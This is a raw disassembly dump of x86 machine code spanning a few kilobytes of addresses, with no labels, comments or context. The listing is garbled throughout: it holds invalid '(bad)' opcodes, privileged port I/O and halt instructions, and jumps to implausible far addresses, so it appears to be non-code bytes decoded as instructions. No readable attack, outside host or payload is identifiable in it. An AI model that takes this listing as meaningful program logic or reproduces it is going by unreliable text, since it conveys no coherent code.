  4167b5:	or     bl,BYTE PTR [edi-0x59]
  4167b8:	xor    DWORD PTR [esi],edx
  4167ba:	bound  edi,QWORD PTR [ebx-0x3ba9f7b3]
  4167c0:	add    BYTE PTR es:[edx],bl
  4167c3:	jl     0x416813
  4167c5:	pop    edi
  4167c6:	or     eax,0xbd463c65
  4167cb:	aam    0x26
  4167cd:	dec    ebp
  4167ce:	fstp   DWORD PTR [eax+0x5d]
  4167d1:	ins    DWORD PTR es:[edi],dx
  4167d2:	(bad)  
  4167d3:	pop    ecx
  4167d4:	add    dl,BYTE PTR [eax-0x38]
  4167d7:	push   ecx
  4167d8:	push   ebx
  4167d9:	jne    0x4167b1
  4167db:	pop    edx
  4167dc:	pop    esi
  4167dd:	add    BYTE PTR [ecx+edx*2+0x4ba77261],dl
  4167e4:	pop    ecx
  4167e5:	arpl   cx,bp
  4167e7:	pushf  
  4167e8:	push   edi
  4167e9:	jno    0x416788
  4167eb:	imul   ebx,DWORD PTR [esi+0x72],0xffffff9a
  4167ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167f0:	xor    BYTE PTR [ebx-0x7c],ah
  4167f3:	pop    ebp
  4167f4:	dec    esi
  4167f5:	arpl   WORD PTR [ebp-0x66ffafa5],sp
  4167fb:	dec    ebp
  4167fc:	push   eax
  4167fd:	je     0x4167e8
  4167ff:	ins    BYTE PTR es:[edi],dx
  416800:	push   edi
  416801:	jno    0x416880
  416803:	fisub  WORD PTR [ebx]
  416805:	imul   eax,DWORD PTR [eax+eax*1+0x0],0x0
	...
  416819:	add    BYTE PTR [eax],al
  41681b:	add    BYTE PTR [edx+esi*1+0x2f75b6d],ah
  416822:	push   ebx
  416823:	pop    edx
  416824:	push   es
  416825:	push   ecx
  416826:	outs   dx,BYTE PTR ds:[esi]
  416827:	dec    eax
  416828:	ficomp WORD PTR [edi+0x0]
  41682b:	cmp    DWORD PTR [edx],eax
  41682d:	push   edx
  41682e:	jno    0x41686e
  416830:	int3   
  416831:	push   eax
  416832:	fs jmp 0x3db2bde4
  416838:	out    0x5b,eax
  41683a:	jb     0x41685b
  41683c:	ret    0x6357
  41683f:	jmp    0x15a7bddd
  416844:	hlt    
  416845:	and    esi,DWORD PTR [edx+0xc]
  416848:	pop    DWORD PTR [ecx+0x6d]
  41684b:	pop    es
  41684c:	lds    ebx,FWORD PTR [edi+0x63]
  41684f:	add    BYTE PTR [ebp+0x31],bh
  416852:	jo     0x416874
  416854:	lea    esp,[edi]
  416856:	data16 je 0x41687a
  416859:	pop    edi
  41685a:	jb     0x4168c1
  41685c:	stos   BYTE PTR es:[edi],al
  41685d:	add    eax,0x2de3746e
  416862:	outs   dx,BYTE PTR ds:[esi]
  416863:	repnz sbb edx,DWORD PTR gs:[eax+0x72]
  416868:	jmp    0xe3adcdce
  41686d:	sub    al,0x0
  41686f:	push   ebx
  416870:	fldenv [ecx+0x74]
  416873:	ja     0x416854
  416875:	sub    eax,0x14105c61
  41687a:	push   eax
  41687b:	push   edi
  41687c:	out    dx,eax
  41687d:	sub    eax,0x5c61
	...
  416892:	add    BYTE PTR [eax],al
  416894:	add    ch,bh
  416896:	or     BYTE PTR [edx+0x45],dl
  416899:	add    BYTE PTR [eax+edx*2],dl
  41689c:	pop    esp
  41689d:	std    
  41689e:	es je  0x416906
  4168a1:	sbb    eax,0x2d6f4800
  4168a6:	xor    eax,DWORD PTR [eax]
  4168a8:	push   ebp
  4168a9:	sub    eax,0x3e007262
  4168ae:	sub    BYTE PTR [edx+0x74],dh
  4168b1:	mov    cs,WORD PTR [edi]
  4168b3:	push   ebx
  4168b4:	add    dh,cl
  4168b6:	xor    ch,BYTE PTR [eax+0x52]
  4168b9:	jle    0x4168c9
  4168bb:	dec    edi
  4168bc:	dec    eax
  4168bd:	mov    gs,WORD PTR [edi]
  4168bf:	jb     0x416930
  4168c1:	loopne 0x4168ea
  4168c3:	ins    BYTE PTR es:[edi],dx
  4168c4:	lods   eax,DWORD PTR gs:[esi]
  4168c6:	call   0xff1bd642
  4168cb:	pop    ebx
  4168cc:	inc    esi
  4168cd:	ret    0x200e
  4168d0:	inc    ebp
  4168d1:	xchg   esi,eax
  4168d2:	cs ins BYTE PTR es:[edi],dx
  4168d4:	outs   dx,DWORD PTR ds:[esi]
  4168d5:	lods   al,BYTE PTR ds:[esi]
  4168d6:	and    esi,DWORD PTR [edx+0x0]
  4168d9:	lea    ebp,[ecx]
  4168db:	data16 je 0x416885
  4168de:	in     al,0x60
  4168e0:	jb     0x4168a4
  4168e2:	adc    eax,0xb9d75442
  4168e7:	ds js  0x4168a1
  4168ea:	cmc    
  4168eb:	push   esi
  4168ec:	jb     0x416878
  4168ee:	(bad)  
  4168ef:	and    eax,0x23e97346
  4168f4:	inc    ebx
  4168f5:	(bad)
	...
  41690d:	add    BYTE PTR [ebp+0x585c53be],dl
  416913:	mov    esp,0xa9746953
  416918:	bound  esp,QWORD PTR [ecx-0x76]
  41691b:	popf   
  41691c:	ss inc esi
  41691e:	fs ins DWORD PTR es:[edi],dx
  416920:	pop    eax
  416921:	ins    DWORD PTR es:[edi],dx
  416922:	push   ebx
  416923:	xchg   edi,eax
  416924:	bound  esi,QWORD PTR [edx-0x76]
  416927:	(bad)  
  416928:	adc    esi,DWORD PTR [edi+eiz*4]
  41692b:	xchg   edi,eax
  41692c:	dec    esi
  41692d:	je     0x416982
  41692f:	je     0x416988
  416931:	jno    0x4168da
  416933:	mov    BYTE PTR [eax+0x66],bl
  416936:	xor    ebp,DWORD PTR [edx+eiz*2+0x72]
  41693a:	dec    edx
  41693b:	popf   
  41693c:	aas    
  41693d:	push   esp
  41693e:	push   edi
  41693f:	mov    ecx,0x8817783e
  416944:	pop    eax
  416945:	jb     0x416949
  416947:	ds and eax,0x62591550
  41694d:	addr16 sti 
  41694f:	inc    esi
  416950:	push   ebx
  416951:	add    bh,dl
  416953:	dec    edx
  416954:	push   ebx
  416955:	jno    0x416947
  416957:	add    BYTE PTR [esi+0x64],dl
  41695a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41695b:	sbb    esp,DWORD PTR [ecx+0x71]
  41695e:	hlt    
  41695f:	clc    
  416960:	push   esi
  416961:	jb     0x41692e
  416963:	pop    ds
  416964:	dec    ecx
  416965:	jo     0x416929
  416967:	stos   DWORD PTR es:[edi],eax
  416968:	cmp    DWORD PTR [ebp-0x2c],ebp
  41696b:	add    bl,BYTE PTR [ebx]
  41696d:	add    al,0xdb
  41696f:	xor    DWORD PTR [esi],eax
  416971:	pop    ebx
	...
  416986:	add    cl,dl
  416988:	add    dh,BYTE PTR [edi]
  41698a:	pop    ecx
  41698b:	mov    ch,0x36
  41698d:	out    0x3a,eax
  41698f:	shr    DWORD PTR [ebx],0xfb
  416992:	pop    edx
  416993:	enter  0x172e,0x63
  416997:	fwait
  416998:	sub    ah,bh
  41699a:	inc    ecx
  41699b:	xchg   ebx,eax
  41699c:	xor    bl,BYTE PTR [edx]
  41699e:	pop    ebx
  41699f:	fwait
  4169a0:	daa    
  4169a1:	adc    eax,0xe72e7c4c
  4169a6:	daa    
  4169a7:	imul   esi,DWORD PTR [eax+eax*8],0xc4365860
  4169ae:	adc    al,0xa7
  4169b0:	lock iret 
  4169b2:	pop    ecx
  4169b3:	add    BYTE PTR [edx],0x9b
  4169b6:	xor    DWORD PTR [eax+0x4e4aab30],eax
  4169bc:	daa    
  4169bd:	mov    eax,DWORD PTR [edx+eax*2+0x30]
  4169c1:	lea    ebx,[edx+0x42]
  4169c4:	pop    esi
  4169c5:	mov    edx,0x8035365e
  4169ca:	pop    eax
  4169cb:	dec    ecx
  4169cc:	xor    eax,0x275627e7
  4169d1:	jp     0x416a27
  4169d3:	inc    eax
  4169d4:	xor    DWORD PTR [ebp-0x79aa58ac],ecx
  4169da:	popa   
  4169db:	adc    edi,DWORD PTR [edx]
  4169dd:	mov    BYTE PTR [ebp+0x4],dl
  4169e0:	pop    edi
  4169e1:	cmp    eax,0x6046f965
  4169e6:	pop    ebx
  4169e7:	add    al,0x5f
  4169e9:	cmp    ah,BYTE PTR [ecx+0x0]
	...
  416a00:	push   es
  416a01:	cmp    BYTE PTR [ecx+0x61],bl
  416a04:	jmp    0xfa845163
  416a09:	xor    BYTE PTR [ebp+0x5d],al
  416a0c:	retf   0xffe2
  416a0f:	sbb    dl,al
  416a11:	ss push 0x742e97e9
  416a17:	sbb    eax,edx
  416a19:	dec    eax
  416a1a:	pop    eax
  416a1b:	cmp    DWORD PTR [ebx-0x28ff8ea2],ebp
  416a21:	and    eax,0x2ddcbf71
  416a26:	ins    BYTE PTR es:[edi],dx
  416a27:	jmp    0x1995b2ac
  416a2c:	aad    0x35
  416a2e:	jno    0x416a31
  416a30:	mov    ds:0x6cfa7354,eax
  416a35:	push   ebx
  416a36:	fld    QWORD PTR [bx+0x77f0]
  416a3b:	int3   
  416a3c:	pop    eax
  416a3d:	add    dl,BYTE PTR [ecx-0x34]
  416a40:	push   esi
  416a41:	cmp    BYTE PTR [ebx-0x25],ah
  416a44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416a45:	push   ebp
  416a46:	jno    0x416a14
  416a48:	push   esi
  416a49:	xor    BYTE PTR [edi-0x34],bl
  416a4c:	inc    edi
  416a4d:	add    dl,BYTE PTR [eax-0x38]
  416a50:	jne    0x416a85
  416a52:	jne    0x416a12
  416a54:	jbe    0x416a7c
  416a56:	add    BYTE PTR [edi-0x71afcda8],ch
  416a5c:	push   esi
  416a5d:	add    BYTE PTR ss:[edx-0x698bd7af],bh
	...
  416a78:	add    BYTE PTR [ebx+0x34],cl
  416a7b:	arpl   WORD PTR [ebp-0x7b88cb9b],sp
  416a81:	neg    BYTE PTR [esi+0x55]
  416a84:	mov    WORD PTR [esi],es
  416a86:	push   edx
  416a87:	addr16 jne 0x416a91
  416a8a:	push   ebx
  416a8b:	jae    0x416ad8
  416a8d:	out    dx,eax
  416a8e:	daa    
  416a8f:	jno    0x416ae2
  416a91:	push   es
  416a92:	xor    eax,0x27e53500
  416a97:	je     0x416abb
  416a99:	shl    BYTE PTR [eax],cl
  416a9b:	arpl   WORD PTR [eax],ax
  416a9d:	out    0x6,al
  416a9f:	bound  ebp,QWORD PTR [ecx-0x66]
  416aa2:	pop    ebx
  416aa3:	outs   dx,BYTE PTR gs:[esi]
  416aa5:	jmp    0x416af5
  416aa7:	cs lea eax,fs:[esi]
  416aab:	dec    eax
  416aac:	outs   dx,DWORD PTR ds:[esi]
  416aad:	lods   eax,DWORD PTR ds:[esi]
  416aae:	push   edx
  416aaf:	outs   dx,BYTE PTR ds:[esi]
  416ab0:	popa   
  416ab1:	mov    bl,0x21
  416ab3:	add    BYTE PTR [ebp-0x63],dl
  416ab6:	and    DWORD PTR [edx+0x6e],esi
  416ab9:	lahf   
  416aba:	pop    ecx
  416abb:	popa   
  416abc:	add    BYTE PTR [esi+0x19736f25],cl
  416ac2:	pop    ecx
  416ac3:	jb     0x416b29
  416ac5:	push   cs
  416ac6:	hlt    
  416ac7:	push   0x72
  416ac9:	sbb    al,BYTE PTR [edi+ecx*2]
  416acc:	outs   dx,DWORD PTR ds:[esi]
  416acd:	fmul   DWORD PTR [edi+0x73]
  416ad0:	popa   
  416ad1:	fsub   QWORD PTR [edx]
  416ad3:	pop    esp
  416ad4:	inc    ebp
  416ad5:	(bad)  
  416ad6:	push   ebx
  416ad7:	pop    ebp
  416ad8:	outs   dx,BYTE PTR ds:[esi]
  416ad9:	dec    edx
  416ada:	push   edx
  416adb:	gs jbe 0x416ade
	...
  416af2:	(bad)  
  416af4:	dec    esi
  416af5:	gs sbb eax,0xe06f6555
  416afb:	push   esp
  416afc:	add    BYTE PTR [ebx+ecx*1+0x4c],bl
  416b00:	jo     0x416b63
  416b02:	xor    BYTE PTR [eax],al
  416b04:	jb     0x416b6f
  416b06:	sbb    BYTE PTR [ebx],ah
  416b08:	add    BYTE PTR [edx+ebp*1+0x52],bl
  416b0c:	gs jbe 0x416b3a
  416b0f:	push   ebp
  416b10:	cs push 0x2d
  416b13:	add    esp,DWORD PTR [edx]
  416b15:	jo     0x416b46
  416b17:	push   esp
  416b18:	outs   dx,DWORD PTR ds:[esi]
  416b19:	ja     0x416b3c
  416b1b:	push   ecx
  416b1c:	and    bl,BYTE PTR fs:[esi+0x9]
  416b20:	and    BYTE PTR [edx],ah
  416b22:	jle    0x416b05
  416b24:	sub    eax,DWORD PTR [eax]
  416b26:	mov    ebp,0xa7746655
  416b2b:	pusha  
  416b2c:	popa   
  416b2d:	jb     0x416b39
  416b2f:	out    dx,al
  416b30:	cmp    al,0x78
  416b32:	test   DWORD PTR [edx+0x56],0x4e52d544
  416b39:	arpl   WORD PTR [edi-0x398fb412],sp
  416b3f:	(bad)  
  416b40:	aas    
  416b41:	jb     0x416b01
  416b43:	pop    ds
  416b44:	pop    ebp
  416b45:	pop    ebp
  416b46:	out    dx,eax
  416b47:	adc    BYTE PTR [ebp+0x63],dl
  416b4a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b4b:	cld    
  416b4c:	pop    esp
  416b4d:	jb     0x416b08
  416b4f:	push   es
  416b50:	push   edx
  416b51:	add    dl,dl
  416b53:	mov    esp,0x725e
	...
  416b68:	add    BYTE PTR [eax],al
  416b6a:	add    BYTE PTR [ecx+0xa],dh
  416b6d:	push   ebp
  416b6e:	arpl   WORD PTR [edi-0x6b8e9ee7],sp
  416b74:	mov    eax,0xa9837254
  416b79:	and    al,0x50
  416b7b:	xchg   ah,bl
  416b7d:	push   eax
  416b7e:	jne    0x416b08
  416b80:	fistp  DWORD PTR [ebp+0x0]
  416b83:	imul   eax,edx,0x4f
  416b86:	arpl   WORD PTR [ebp+edi*2-0x56a18dac],ax
  416b8d:	xor    BYTE PTR [ebp+0x41],ch
  416b90:	jge    0x416bde
  416b92:	pop    edi
  416b93:	push   ebp
  416b94:	(bad)  
  416b95:	and    eax,0x2171644e
  416b9a:	push   ecx
  416b9b:	push   eax
  416b9c:	xchg   DWORD PTR [ebp+0x75],ecx
  416b9f:	inc    esi
  416ba0:	fwait
  416ba1:	pop    esi
  416ba2:	pop    esp
  416ba3:	fs cmp eax,0x92347162
  416ba9:	pusha  
  416baa:	inc    esi
  416bab:	sti    
  416bac:	fwait
  416bad:	and    eax,0x429bf346
  416bb2:	popa   
  416bb3:	add    al,0x3d
  416bb5:	dec    esi
  416bb6:	outs   dx,BYTE PTR ds:[esi]
  416bb7:	adc    eax,DWORD PTR [ebx]
  416bb9:	pop    edx
  416bba:	add    al,0xe9
  416bbc:	ss push edi
  416bbe:	xor    DWORD PTR [ecx+esi*1],eax
  416bc1:	pop    ebp
  416bc2:	pop    edi
  416bc3:	cmc    
  416bc4:	add    ah,BYTE PTR ds:0x3a57f750
  416bca:	pop    edi
  416bcb:	aad    0x4c
  416bcd:	dec    eax
  416bce:	push   edi
	...
  416be3:	add    ah,al
  416be5:	add    ch,BYTE PTR ds:0x4852d750
  416beb:	push   ecx
  416bec:	(bad)  
  416bed:	xor    eax,0x2cb5216
  416bf2:	ds ds mov bl,0x32
  416bf6:	aaa    
  416bf7:	arpl   WORD PTR [esi-0x4aaae9cf],si
  416bfd:	es out 0x3d,eax
  416c00:	fwait
  416c01:	xor    ah,BYTE PTR [ebx]
  416c03:	pop    ebx
  416c04:	xchg   ebp,eax
  416c05:	daa    
  416c06:	or     dl,BYTE PTR [eax-0x7e]
  416c09:	xor    al,dh
  416c0b:	add    esi,DWORD PTR [esi+0x4d]
  416c0e:	lods   eax,DWORD PTR ds:[esi]
  416c0f:	das    
  416c10:	pop    edx
  416c11:	inc    ebx
  416c12:	mov    ecx,0xaa4c5b3e
  416c17:	cmp    eax,edi
  416c19:	push   ecx
  416c1a:	mov    esi,0xc835735d
  416c1f:	push   ecx
  416c20:	inc    esp
  416c21:	pop    esi
  416c22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c23:	push   edi
  416c24:	inc    eax
  416c25:	sub    al,0xce
  416c27:	daa    
  416c28:	nop
  416c29:	and    edx,ecx
  416c2b:	push   esp
  416c2c:	push   esp
  416c2d:	sub    al,0x9b
  416c2f:	push   eax
  416c30:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416c31:	push   ecx
  416c32:	mov    ds,WORD PTR [ebp+0x33]
  416c35:	xor    eax,0x5e445188
  416c3a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416c3b:	das    
  416c3c:	push   edi
  416c3d:	inc    ecx
  416c3e:	xchg   ebx,eax
  416c3f:	pop    edx
  416c40:	add    al,0x2d
  416c42:	jae    0x416c6b
  416c44:	imul   BYTE PTR [ebx]
  416c46:	add    BYTE PTR [ebp+0x0],bh
	...
  416c5d:	icebp  
  416c5e:	xor    eax,DWORD PTR [eax]
  416c60:	call   0x30ca:0x5e7424f3
  416c67:	arpl   WORD PTR ds:0x5d662fd0,di
  416c6d:	shr    esp,cl
  416c6f:	ins    BYTE PTR es:[edi],dx
  416c70:	pop    ebx
  416c71:	mov    esp,0xfb1d465e
  416c76:	inc    ebx
  416c77:	ins    BYTE PTR es:[edi],dx
  416c78:	push   eax
  416c79:	mov    gs,WORD PTR [esp+esi*2]
  416c7c:	adc    eax,0x447425f8
  416c81:	nop
  416c82:	add    ch,BYTE PTR [esi]
  416c84:	push   ss
  416c85:	and    DWORD PTR [ebx],0x0
  416c88:	iret   
  416c89:	jne    0x416cb9
  416c8b:	ins    BYTE PTR es:[edi],dx
  416c8c:	jmp    0x3a91b461
  416c91:	je     0x416cb7
  416c93:	je     0x416c93
  416c95:	retf   
  416c96:	xor    BYTE PTR [ebx+0x1d],ah
  416c99:	outs   dx,DWORD PTR ds:[esi]
  416c9a:	and    eax,0x36c80c72
  416c9f:	ins    DWORD PTR es:[edi],dx
  416ca0:	sti    
  416ca1:	retf   
  416ca2:	loop   0x416cf0
  416ca4:	fnstcw WORD PTR [edi+0x51bd0033]
  416caa:	sub    bl,BYTE PTR [edi-0x25]
  416cad:	mov    edi,0xb0c45126
  416cb2:	xlat   BYTE PTR ss:[bx]
  416cb5:	lea    esi,[ebx]
  416cb7:	cs retf 0x3381
  416cbb:	add    BYTE PTR [ebp-0x44a0d587],dl
	...
  416cd5:	add    BYTE PTR [edi+0x26],bh
  416cd8:	push   ecx
  416cd9:	mov    WORD PTR [eax+0x36],?
  416cdc:	addr16 (bad) 
  416cde:	lea    esi,[ebx]
  416ce0:	pop    ebp
  416ce1:	fadd   DWORD PTR [ebp-0xe]
  416ce4:	pop    esp
  416ce5:	aam    0xb6
  416ce7:	and    DWORD PTR [ecx+0x0],esp
  416cea:	sbb    eax,0x36535c00
  416cef:	out    0x71,eax
  416cf1:	and    dl,BYTE PTR gs:[ebp+0x61]
  416cf5:	je     0x416d09
  416cf7:	out    dx,eax
  416cf8:	ins    DWORD PTR es:[edi],dx
  416cf9:	fnsave [bx+si+0x7170]
  416cfe:	jmp    0x4f5c:0x7e6573ed
  416d05:	push   0x6460f4df
  416d0a:	mov    ebp,0xf77473e9
  416d0f:	lock bound esi,QWORD PTR [ebx-0x47]
  416d13:	mov    ch,0x5c
  416d15:	xor    BYTE PTR [ecx-0x608cd447],bl
  416d1b:	bnd fs je 0x416cc2
  416d1f:	push   es
  416d20:	pop    esp
  416d21:	inc    ebx
  416d22:	test   eax,0xa36565e8
  416d27:	inc    ebx
  416d28:	jno    0x416d9a
  416d2a:	out    dx,al
  416d2b:	push   esp
  416d2c:	imul   esp,DWORD PTR [esi+0x12],0xfffffff9
  416d30:	pop    esp
  416d31:	jb     0x416cd6
  416d33:	push   es
  416d34:	ins    BYTE PTR es:[edi],dx
  416d35:	gs lahf 
  416d37:	mul    BYTE PTR [ebp+0x74]
	...
  416d4e:	add    dh,bl
  416d50:	push   DWORD PTR [eax+0x6e]
  416d53:	jmp    0x77e9:0xa8705cea
  416d5a:	gs (bad) 
  416d5c:	hlt    
  416d5d:	fs je  0x416d53
  416d60:	hlt    
  416d61:	sub    eax,0xfff3ef64
  416d66:	jb     0x416d4f
  416d68:	repz pusha 
  416d6a:	jae    0x416d34
  416d6c:	out    dx,al
  416d6d:	ins    DWORD PTR es:[edi],dx
  416d6e:	imul   ecx,esi,0x2f654c5b
  416d74:	lock push edx
  416d76:	popa   
  416d77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416d78:	xchg   edi,eax
  416d79:	sub    BYTE PTR [ebx+ebx*2-0x7a],bl
  416d7d:	and    al,0x70
  416d7f:	jmp    0xf441bf21
  416d84:	ins    BYTE PTR es:[edi],dx
  416d85:	inc    edi
  416d86:	push   esp
  416d87:	clc    
  416d88:	push   0x53
  416d8a:	inc    ebx
  416d8b:	jmp    0x416d2a
  416d8d:	sub    BYTE PTR [edi-0x9],bl
  416d90:	cld    
  416d91:	and    BYTE PTR [edx+0x2],dh
  416d94:	stos   BYTE PTR es:[edi],al
  416d95:	dec    edx
  416d96:	outs   dx,BYTE PTR ds:[esi]
  416d97:	hlt    
  416d98:	pop    ebp
  416d99:	and    DWORD PTR [ebx+edi*8-0x7],ebp
  416d9d:	and    BYTE PTR [edi+ecx*8-0x57],dh
  416da1:	inc    ebp
  416da2:	pop    edi
  416da3:	ror    DWORD PTR [edx+0x48],cl
  416da6:	addr16 aad 0xa9
  416da9:	push   ecx
  416daa:	pop    edi
  416dab:	aam    0xf8
  416dad:	ss ins DWORD PTR es:[edi],dx
  416daf:	mov    ch,0xd
  416db1:	add    al,0x48
	...
  416dc7:	add    al,cl
  416dc9:	sbb    BYTE PTR [eax],bh
  416dcb:	dec    esi
  416dcc:	mov    BYTE PTR [esi],0x25
  416dcf:	add    dl,dl
  416dd1:	sbb    BYTE PTR ds:0x2d0a7172,ah
  416dd7:	arpl   WORD PTR [edi-0x7f94dae9],sp
  416ddd:	mov    ebp,0xb77e4426
  416de2:	es popa 
  416de4:	jnp    0x416dba
  416de6:	xor    esi,DWORD PTR [edi-0x59]
  416de9:	jns    0x416e1b
  416deb:	jb     0x416e68
  416ded:	arpl   WORD PTR [esi],si
  416def:	imul   eax,DWORD PTR [ebp+0x690033c6],0xffffff98
  416df6:	push   ecx
  416df7:	jb     0x416e41
  416df9:	jne    0x416e2b
  416dfb:	popa   
  416dfc:	inc    eax
  416dfd:	lds    eax,FWORD PTR [ecx]
  416dff:	push   ecx
  416e00:	cmp    bl,al
  416e02:	xor    eax,0x99024675
  416e07:	es pop ebx
  416e09:	dec    ebp
  416e0a:	mov    BYTE PTR ds:0xe385293b,dh
  416e10:	pop    eax
  416e11:	xor    BYTE PTR [eax-0x6cc3ead4],al
  416e17:	add    edi,ebx
  416e19:	cmc    
  416e1a:	mov    eax,0xad2f0845
  416e1f:	aaa    
  416e20:	pop    ss
  416e21:	jmp    0x3499fa5
  416e26:	xor    eax,0x532bd648
  416e2b:	daa    
	...
  416e40:	add    dh,dh
  416e42:	call   0x341a086
  416e47:	sub    edx,DWORD PTR [edx-0x3c]
  416e4a:	sub    esi,DWORD PTR cs:[esi]
  416e4d:	shl    BYTE PTR [eax],0x44
  416e50:	add    al,0xf7
  416e52:	and    edi,DWORD PTR [edx]
  416e54:	xor    eax,0x283929f2
  416e59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e5a:	dec    edi
  416e5b:	sbb    DWORD PTR [eax],esi
  416e5d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e5e:	dec    edi
  416e5f:	sbb    ah,BYTE PTR [edi]
  416e61:	mov    ch,0x48
  416e63:	or     BYTE PTR [edi],ch
  416e65:	les    eax,FWORD PTR [edx]
  416e67:	cmp    DWORD PTR [ecx],esi
  416e69:	xchg   edx,eax
  416e6a:	sub    ebp,DWORD PTR cs:[ebx]
  416e6d:	xchg   ebp,eax
  416e6e:	pop    ds
  416e6f:	or     bh,BYTE PTR [eax]
  416e71:	xor    BYTE PTR [eax+esi*8],0x3
  416e75:	ja     0x416ea0
  416e77:	stc    
  416e78:	aaa    
  416e79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416e7a:	push   ebp
  416e7b:	(bad)  
  416e7c:	sub    DWORD PTR [ebx+0x31],esi
  416e7f:	enter  0x8435,0x56
  416e83:	mov    edx,0xbf2e7430
  416e88:	jecxz  0x416f00
  416e8a:	sub    edi,DWORD PTR [ebp-0x6d1daada]
  416e90:	es inc esi
  416e92:	sub    al,BYTE PTR [eax]
  416e94:	(bad)  
  416e95:	xchg   edi,eax
  416e96:	es ins DWORD PTR es:[edi],dx
  416e98:	(bad)  
  416e99:	lea    esp,ds:0x255fc571
  416e9f:	bound  esp,QWORD PTR [ebp-0x7389de86]
	...
  416eb9:	add    BYTE PTR [eax+0x43],cl
  416ebc:	ins    DWORD PTR es:[edi],dx
  416ebd:	jg     0x416e95
  416ebf:	and    eax,0x27cd7d61
  416ec4:	outs   dx,BYTE PTR ds:[esi]
  416ec5:	jp     0x416e6b
  416ec7:	push   ebx
  416ec8:	arpl   WORD PTR [ebx-0x32],di
  416ecb:	and    eax,0x32bd9572
  416ed0:	arpl   cx,bp
  416ed2:	loop   0x416f22
  416ed4:	push   eax
  416ed5:	or     esp,esp
  416ed7:	inc    edi
  416ed8:	dec    esi
  416ed9:	cmp    eax,0xe94c47d5
  416ede:	jmp    0x48:0xe82a504e
  416ee5:	setnp  BYTE PTR [esi+eiz*2]
  416ee9:	jmp    0x3eb3c1d6
  416eee:	mov    DWORD PTR [ecx],esp
  416ef0:	ins    BYTE PTR es:[edi],dx
  416ef1:	or     al,0x74
  416ef3:	add    al,BYTE PTR [ecx-0x71f898e4]
  416ef9:	pop    edx
  416efa:	sti    
  416efb:	and    BYTE PTR [ecx+0x3e],dh
  416efe:	pusha  
  416eff:	sub    dh,BYTE PTR [ebp+edi*8-0x2c]
  416f03:	cld    
  416f04:	sub    al,0xce
  416f06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416f07:	sub    dh,BYTE PTR [ebp+edi*8-0x2c]
  416f0b:	xor    edi,DWORD PTR [edx]
  416f0d:	mov    esi,0xdd63b911
  416f12:	mov    ah,0xfc
  416f14:	sub    al,0xe
  416f16:	stos   DWORD PTR es:[edi],eax
  416f17:	daa    
  416f18:	jo     0x416ee6
  416f1a:	mov    dh,0x59
  416f1c:	add    dh,dl
	...
  416f32:	add    BYTE PTR [ebx-0x4fff9bd8],cl
  416f38:	jmp    0x6f4f:0x57be745c
  416f3f:	fdiv   st,st(0)
  416f41:	jb     0x416fa4
  416f43:	cld    
  416f44:	jmp    0xea5fbea4
  416f49:	jno    0x416fac
  416f4b:	ficom  WORD PTR [ebx+0x6b]
  416f4e:	data16 or dh,al
  416f51:	pop    esp
  416f52:	jb     0x416f7f
  416f54:	add    al,0x4c
  416f56:	popa   
  416f57:	sbb    eax,0x37441ff0
  416f5c:	repnz pusha 
  416f5e:	arpl   WORD PTR [edx],cx
  416f60:	jmp    0x47ee8d6
  416f65:	dec    esp
  416f66:	popa   
  416f67:	(bad)  
  416f69:	pop    ds
  416f6a:	dec    ecx
  416f6b:	loopne 0x416f60
  416f6d:	jae    0x416fd0
  416f6f:	loop   0x416f63
  416f71:	pop    ds
  416f72:	push   eax
  416f73:	out    dx,eax
  416f74:	cli    
  416f75:	add    BYTE PTR [bx+di+0x60ee],dl
  416f7a:	jb     0x416f5b
  416f7c:	test   al,0x45
  416f7e:	push   esp
  416f7f:	adc    DWORD PTR [edx+0x5c],0x73
  416f83:	out    0xe9,al
  416f85:	imul   ebp,DWORD PTR [edx+eiz*8-0x19],0x6f
  416f8a:	mov    al,gs:0xa36f5f22
  416f90:	icebp  
  416f91:	pop    esp
  416f92:	outs   dx,BYTE PTR ds:[esi]
  416f93:	stos   BYTE PTR es:[edi],al
  416f94:	(bad)  
  416f95:	jb     0x417000
	...
  416fab:	add    BYTE PTR ds:0xe7465eb,bl
  416fb1:	cmc    
  416fb2:	jno    0x41702a
  416fb4:	or     eax,0x695fa6
  416fb9:	add    al,0x5c
  416fbb:	inc    ecx
  416fbc:	in     eax,dx
  416fbd:	jmp    0x6f4f:0x43a4941
  416fc4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416fc5:	(bad)  
  416fc6:	xor    eax,0x28db4675
  416fcb:	pop    esp
  416fcc:	data16 int3 
  416fce:	sub    BYTE PTR [edx+0x5e],al
  416fd1:	lea    eax,[ecx]
  416fd3:	dec    ebx
  416fd4:	jne    0x416f6c
  416fd6:	add    DWORD PTR [ecx+0x70],edx
  416fd9:	pop    edi
  416fda:	push   ebp
  416fdb:	push   ebp
  416fdc:	data16 jnp 0x417027
  416fdf:	pop    esp
  416fe0:	test   DWORD PTR fs:[ecx+esi*2],esp
  416fe4:	xor    al,0x86
  416fe6:	xor    bl,BYTE PTR [ebx+edi*8-0x6e]
  416fea:	xor    DWORD PTR [ebx-0x15],esp
  416fed:	xchg   edx,eax
  416fee:	pop    ds
  416fef:	pop    esp
  416ff0:	or     al,0x6d
  416ff2:	aas    
  416ff3:	das    
  416ff4:	loope  0x417071
  416ff6:	inc    edx
  416ff7:	xor    cl,ch
  416ff9:	jbe    0x416ff4
  416ffb:	das    
  416ffc:	mov    esi,0xe633ed15
  417001:	jmp    0x3345:0xece52b3e
  417008:	xchg   edx,eax
  417009:	or     eax,0xb5913ef1
  41700e:	inc    esi
  41700f:	xor    al,BYTE PTR [eax]
	...
  417025:	cwde   
  417026:	fcomip st,st(2)
  417028:	xor    al,0x90
  41702a:	out    dx,al
  41702b:	add    edx,DWORD PTR [ecx-0x10]
  41702e:	fist   WORD PTR [edi+0x55]
  417031:	out    0xfb,al
  417033:	inc    esp
  417034:	pop    esp
  417035:	in     al,0x5
